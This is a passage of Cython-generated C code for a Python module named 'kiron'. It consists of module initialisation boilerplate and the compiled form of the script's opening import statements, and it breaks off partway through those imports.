      NULL, /* m_reload */
    #endif
    #if CYTHON_USE_MODULE_STATE
      __pyx_m_traverse, /* m_traverse */
      __pyx_m_clear, /* m_clear */
      NULL /* m_free */
    #else
      NULL, /* m_traverse */
      NULL, /* m_clear */
      NULL /* m_free */
    #endif
  };
  #ifdef __cplusplus
} /* anonymous namespace */
#endif
#endif

#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initkiron(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initkiron(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_kiron(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_kiron(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
#if CYTHON_COMPILING_IN_LIMITED_API
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *module, const char* from_name, const char* to_name, int allow_none)
#else
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none)
#endif
{
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
#if CYTHON_COMPILING_IN_LIMITED_API
            result = PyModule_AddObject(module, to_name, value);
#else
            result = PyDict_SetItemString(moddict, to_name, value);
#endif
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    CYTHON_UNUSED_VAR(def);
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
#if CYTHON_COMPILING_IN_LIMITED_API
    moddict = module;
#else
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
#endif
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_kiron(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  int stringtab_initialized = 0;
  #if CYTHON_USE_MODULE_STATE
  int pystate_addmodule_run = 0;
  #endif
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  long __pyx_t_11;
  Py_ssize_t __pyx_t_12;
  Py_UCS4 __pyx_t_13;
  int __pyx_t_14;
  int __pyx_t_15;
  char const *__pyx_t_16;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  PyObject *__pyx_t_21 = NULL;
  PyObject *__pyx_t_22 = NULL;
  PyObject *(*__pyx_t_23)(PyObject *);
  PyObject *__pyx_t_24 = NULL;
  char const *__pyx_t_25;
  PyObject *__pyx_t_26 = NULL;
  PyObject *__pyx_t_27 = NULL;
  PyObject *__pyx_t_28 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'kiron' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("kiron", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #elif CYTHON_USE_MODULE_STATE
  __pyx_t_1 = PyModule_Create(&__pyx_moduledef); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  {
    int add_module_result = PyState_AddModule(__pyx_t_1, &__pyx_moduledef);
    __pyx_t_1 = 0; /* transfer ownership from __pyx_t_1 to "kiron" pseudovariable */
    if (unlikely((add_module_result < 0))) __PYX_ERR(0, 1, __pyx_L1_error)
    pystate_addmodule_run = 1;
  }
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #endif
  CYTHON_UNUSED_VAR(__pyx_t_1);
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = __Pyx_PyImport_AddModuleRef(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_cython_runtime = __Pyx_PyImport_AddModuleRef((const char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_kiron(void)", 0);
  if (__Pyx_check_binary_version(__PYX_LIMITED_VERSION_HEX, __Pyx_get_runtime_version(), CYTHON_COMPILING_IN_LIMITED_API) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  stringtab_initialized = 1;
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_kiron) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "kiron")) {
      if (unlikely((PyDict_SetItemString(modules, "kiron", __pyx_m) < 0))) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  if (unlikely((__Pyx_modinit_type_init_code() < 0))) __PYX_ERR(0, 1, __pyx_L1_error)
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

  /* "kiron.py":2
 * #__________________| IMPORT |__________________#
 * from os import path             # <<<<<<<<<<<<<<
 * import requests,random,uuid,string,hashlib,json
 * from os import path
 */
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_path);
  __Pyx_GIVEREF(__pyx_n_s_path);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_path)) __PYX_ERR(0, 2, __pyx_L1_error);
  __pyx_t_3 = __Pyx_Import(__pyx_n_s_os, __pyx_t_2, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_path, __pyx_t_2) < 0) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":3
 * #__________________| IMPORT |__________________#
 * from os import path
 * import requests,random,uuid,string,hashlib,json             # <<<<<<<<<<<<<<
 * from os import path
 * import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
 */
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_requests, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_3) < 0) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_random, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_3) < 0) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_uuid, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_3) < 0) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_string, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_string, __pyx_t_3) < 0) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_hashlib, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hashlib, __pyx_t_3) < 0) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_json, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_3) < 0) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":4
 * from os import path
 * import requests,random,uuid,string,hashlib,json
 * from os import path             # <<<<<<<<<<<<<<
 * import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
 * from time import localtime as lt
 */
  __pyx_t_3 = PyList_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_n_s_path);
  __Pyx_GIVEREF(__pyx_n_s_path);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 0, __pyx_n_s_path)) __PYX_ERR(0, 4, __pyx_L1_error);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_os, __pyx_t_3, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_path, __pyx_t_3) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":5
 * import requests,random,uuid,string,hashlib,json
 * from os import path
 * import os,uuid,base64,requests,zlib,httpx,time,platform,datetime             # <<<<<<<<<<<<<<
 * from time import localtime as lt
 * from urllib.request import urlopen
 */
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_os, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_uuid, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_base64, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_requests, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_zlib, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_zlib, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_httpx, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_httpx, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_time, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_platform, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_platform, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_datetime, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":6
 * from os import path
 * import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
 * from time import localtime as lt             # <<<<<<<<<<<<<<
 * from urllib.request import urlopen
 * import os,base64,zlib,pip,urllib,urllib3
 */
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_localtime);
  __Pyx_GIVEREF(__pyx_n_s_localtime);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_localtime)) __PYX_ERR(0, 6, __pyx_L1_error);
  __pyx_t_3 = __Pyx_Import(__pyx_n_s_time, __pyx_t_2, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_3, __pyx_n_s_localtime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_lt, __pyx_t_2) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":7
 * import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
 * from time import localtime as lt
 * from urllib.request import urlopen             # <<<<<<<<<<<<<<
 * import os,base64,zlib,pip,urllib,urllib3
 * import platform,math,smtplib
 */
  __pyx_t_3 = PyList_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_n_s_urlopen);
  __Pyx_GIVEREF(__pyx_n_s_urlopen);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 0, __pyx_n_s_urlopen)) __PYX_ERR(0, 7, __pyx_L1_error);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_urllib_request, __pyx_t_3, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_urlopen); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_urlopen, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":8
 * from time import localtime as lt
 * from urllib.request import urlopen
 * import os,base64,zlib,pip,urllib,urllib3             # <<<<<<<<<<<<<<
 * import platform,math,smtplib
 * import platform
 */
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_os, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_base64, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_zlib, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_zlib, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_pip, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pip, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_urllib, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_urllib, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_urllib3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_urllib3, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":9
 * from urllib.request import urlopen
 * import os,base64,zlib,pip,urllib,urllib3
 * import platform,math,smtplib             # <<<<<<<<<<<<<<
 * import platform
 * import smtplib
 */
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_platform, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_platform, __pyx_t_2) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_math, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_math, __pyx_t_2) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_smtplib, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_smtplib, __pyx_t_2) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":10
 * import os,base64,zlib,pip,urllib,urllib3
 * import platform,math,smtplib
 * import platform             # <<<<<<<<<<<<<<
 * import smtplib
 * import math
 */
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_platform, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_platform, __pyx_t_2) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":11
 * import platform,math,smtplib
 * import platform
 * import smtplib             # <<<<<<<<<<<<<<
 * import math
 * import os,base64,zlib,pip,urllib
 */
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_smtplib, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_smtplib, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

